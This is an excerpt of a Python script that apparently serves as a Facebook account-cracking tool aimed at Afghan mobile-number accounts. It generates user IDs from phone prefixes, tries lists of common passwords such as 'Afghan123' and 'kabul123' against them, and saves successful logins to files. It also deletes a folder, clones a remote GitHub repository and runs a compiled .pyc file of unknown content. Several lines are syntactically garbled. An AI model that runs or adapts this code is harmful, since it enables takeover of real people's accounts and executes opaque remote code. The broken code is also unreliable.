#---------------------[Hk-HassanKarimi]---------------------#
#Hassan Karimi 
IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
        os.system('python hfHf249_mix.py')  
       
fbks=('https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
...
.##..##..##..##...####....####...##..##..##..##.
................................................ 
╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m Hassan \033[1;36m Karimi 
╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m Hassan & \033[1;33mBARIE
╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m Hassan_Tech TEACH
╠══[\033[1;34m[•] TELEGRAM \033[1;32m:\033[1;34m t.me/Hassan_Tech
...
        return None
    if opt == '1':
    os.system('rm -rf Hassan&& git clone git clone 
https://github.com/hfHf249/Karimi1.git
cd Hassan1
PythonHassan1.py-/ && cd Hassan1 && python Hassan_DUMP.pyc')
...
print('[3] FOLLOW MY Facebook https://www.facebook.com/profile.php?id=100070283389809')
...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000'۱٠٠۲٠٠'۱٠۲٠۳٠'۱۲۳۴۵۶۷۸۹٠'ABCDEF'#۱٠٠۲٠٠'۷۸۹۷۸۹']
...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶'Mazar123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 9370, 9378, 9377, 9379, 9374'9376)
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123','۱۰۰۲۰۰'Mazar123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
